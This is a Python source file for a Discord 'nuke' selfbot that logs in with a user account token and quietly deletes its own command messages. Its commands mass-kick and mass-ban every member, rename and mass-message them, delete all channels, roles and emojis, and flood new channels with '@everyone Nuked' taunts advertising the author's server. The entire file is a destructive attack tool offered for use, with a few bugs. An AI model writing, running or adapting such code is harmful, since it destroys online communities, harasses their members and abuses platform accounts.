import keep_alive
import os
from config import yourprefix
from config import token
 # refer to main branch
prefix = yourprefix 
import asyncio

import discord
from discord.ext import commands

print ("Loading..")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None, self_bot=True)
# Construct an instance of commands.Bot

@bot.event
async def on_command_error(ctx, error):
    pass

@bot.check
async def command_invoke_delete(ctx):
    try:
        await ctx.message.delete()
    except discord.Forbidden:
        # lol this should never happen
        pass
    finally:
        return True

@bot.event
async def on_ready():
    print("Ready To Have Some Fun! \n Discord Server: https://discord.gg/rCg898b45A \n Youtube Channel: https://www.youtube.com/channel/UCXk0klxbjcVgGvYyKWLgtLg")

@bot.command()
async def kall(ctx):
    for member in ctx.guild.members:

        if member == bot.user:
            continue

        try:
            await member.kick()
        except discord.Forbidden:
            print(f"{member.name} has FAILED to be kicked from {ctx.guild.name}")
        else:
            print(f"{member.name} has been kicked from {ctx.guild.name}")

    print("Action Completed: kall")

@bot.command()
async def ball(ctx):
    for member in ctx.guild.members:
        
        if member == bot.user:
            continue

        try:
            await member.ban()
        except discord.Forbidden:
            print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
        else:
            print(f"{member.name} has been kicked from {ctx.guild.name}")
    
    print("Action Completed: ball")  

@bot.command()
async def rall(ctx, *, nick):
    for member in ctx.guild.members:
            
        try:
            await member.edit(nick=nick)
        except discord.Forbidden:
            print(f"{member.name} has NOT been renamed to {nick} in {ctx.guild.name}")
        else:
            print(f"{member.name} has been renamed to {nick} in {ctx.guild.name}")
            
    print("Action Completed: rall")

@bot.command()
async def mall(ctx, *, message):
    for member in ctx.guild.members:
        
        if member == bot.user:
            continue
            
        try:
            await member.send(message)
        except discord.Forbidden:
            print(f"{member.name} has NOT recieved the message.")
        else:
            print(f"{member.name} has recieved the message.")
            
    print("Action Completed: mall")

@bot.group(invoke_without_command=True, case_insensitive=True)
async def dall(ctx):
    print(f'Choose an option from -> {", ".join([c.name for c in ctx.command.commands])}')
    
@dall.command()
async def channels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        except discord.HTTPException:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{channel.name} has been deleted in {ctx.guild.name}")
    print("Action Completed: dall channels")  

@dall.command()
async def roles(ctx):

    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.delete()
        except discord.Forbidden:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{role.name} has been deleted in {ctx.guild.name}")
                
    print("Action Completed: dall roles")
  
@dall.command()
async def emojis(ctx):
    
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")
        except discord.Forbidden:
            print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")
            
    print("Action Completed: dall emojis")

@dall.command()
async def all(ctx):
    # LOL
    print('Deleting all...')
    
    print('Deleting channels..')
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        except discord.HTTPException:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{channel.name} has been deleted in {ctx.guild.name}")
        
    print('Deleting roles..')
    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.delete()
        except discord.Forbidden:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{role.name} has been deleted in {ctx.guild.name}")
            
    print('Deleting emojis..')
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except discord.Forbidden:
            print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")
            
    print("Action Completed: dall all")
   
@bot.command()
async def destroy(ctx):

    for member in ctx.guild.members:

        if member == bot.user:
            continue

        try:
            await member.ban()
        except discord.Forbidden:
            print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
        else:
            print(f"{member.name} has been banned from {ctx.guild.name}")

    await all(ctx)

    print("Action Completed: destroy")
@dall.command(pass_context=True)
async def sex(ctx):
    await ctx.message.delete()
    for member in list(dall.get_all_members()): 
        await asyncio.sleep(0)
        try:
            embed = discord.Embed(title="This Is Why You Dont Wanna Give Random People Admin!", url="https://github.com/Social404/Advanced-Discord-Nuke-Bot", description="They Nuke Your Server With A Free Source Code (Click The Text Above For The Code)" , color=discord.Colour.purple())
            embed.add_field(
                name="Discord Server",
                value=
                "[ [ Click here ] ](https://discord.gg/kE9vk9Zeuf)",
                inline=False)
            embed.add_field(
                name="Youtube Channel",
                value=
                "[ [ Click here ] ](https://www.youtube.com/channel/UCpDamIPHLt38gk8uXcGiQpA)",
                inline=False)
            embed.add_field(
                name="GitHub",
                value=
                "[ [ Click here ] ](https://github.com/social404)",
                inline=False)
            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
            embed.set_footer(text="Nuked By Social404's Bot! Sorry About Your Loss")

        except:
            pass
        print("Action completed: Message all")
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("Nuked By Social Fuckersss")
        await channel.send("@everyone Nuked Fuckers lmaooo Ezz win for https://discord.gg/kE9vk9Zeuf")


keep_alive.keep_alive()

try:
    bot.run(token, bot=False)
except discord.LoginFailure:
    print('Invalid Token Passed')
